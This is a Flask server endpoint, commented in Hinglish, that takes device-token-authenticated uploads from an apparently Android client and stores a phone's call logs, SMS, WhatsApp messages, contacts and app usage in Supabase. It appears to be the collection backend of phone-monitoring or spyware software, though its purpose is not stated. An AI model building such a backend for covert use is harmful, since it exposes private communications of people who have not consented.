import json
from flask import Blueprint, request, jsonify
from database import supabase

vault_bp = Blueprint('vault_bp', __name__)

@vault_bp.route('/api/vault/sync', methods=['POST'])
def sync_vault_data():
    token = request.headers.get('X-Device-Token')
    data = request.get_json() or {}

    if not token:
        return jsonify({"status": "error", "message": "Access Refused"}), 401

    # 1. 🚀 Authenticate Device & Get Internal Database ID
    device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
    if not device_check.data:
        return jsonify({"status": "error", "message": "Device not authenticated"}), 403
    
    dev_id = device_check.data[0]['id']
    payloads = data.get("payloads", [])

    if not payloads:
        return jsonify({"status": "success", "message": "Vault empty, nothing to sync."})

    # 2. 🚀 SMART DISTRIBUTION ENGINE
    # Ye JSON ko unpack karke sahi tables me route karega
    for item in payloads:
        # Kotlin CamelCase aur Python SnakeCase dono ko handle karne ke liye
        module_type = item.get("moduleType") or item.get("module_type", "")
        raw_payload = item.get("payloadJson") or item.get("payload_json", "[]")
        
        try:
            parsed_data = json.loads(raw_payload)
        except Exception:
            continue
            
        if not parsed_data or not isinstance(parsed_data, list):
            continue
            
        try:
            if module_type == "calls":
                records = [{"device_id": dev_id, "phone_number": c.get("number", ""), "type": c.get("type", ""), "duration": c.get("duration", 0), "timestamp": c.get("timestamp", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('calls').insert(records).execute()
                
            elif module_type == "sms":
                records = [{"device_id": dev_id, "sender": c.get("number", ""), "message": c.get("message", ""), "timestamp": c.get("timestamp", ""), "type": c.get("type", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('messages').insert(records).execute()
                
            elif module_type == "whatsapp":
                # WhatsApp ke data ko exactly whatsapp_logs table me route kar rahe hain
                records = [{"device_id": dev_id, "sender": c.get("number", ""), "message": c.get("message", ""), "timestamp": c.get("timestamp", ""), "type": c.get("type", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('whatsapp_logs').insert(records).execute()
                
            elif module_type == "contacts":
                # Contacts save karne se pehle purane contacts delete karenge taaki duplicate na bane
                records = [{"device_id": dev_id, "name": c.get("name", ""), "phone_number": c.get("phone_number", "")} for c in parsed_data]
                supabase.table('contacts').delete().eq('device_id', dev_id).execute()
                supabase.table('contacts').insert(records).execute()
                
            elif module_type in ["app_usage", "installed_apps"]:
                records = [{"device_id": dev_id, "app_name": c.get("app_name", ""), "package_name": c.get("package_name", ""), "time_spent": c.get("time_spent", 0)} for c in parsed_data]
                supabase.table('app_usage').delete().eq('device_id', dev_id).execute()
                supabase.table('app_usage').insert(records).execute()
                
        except Exception as e:
            # Agar koi specific module fail ho, toh baki modules rukne nahi chahiye
            print(f"Failed to route module {module_type}: {str(e)}")
            continue

    return jsonify({"status": "success", "message": "Vault data intelligently routed to respective tables."})
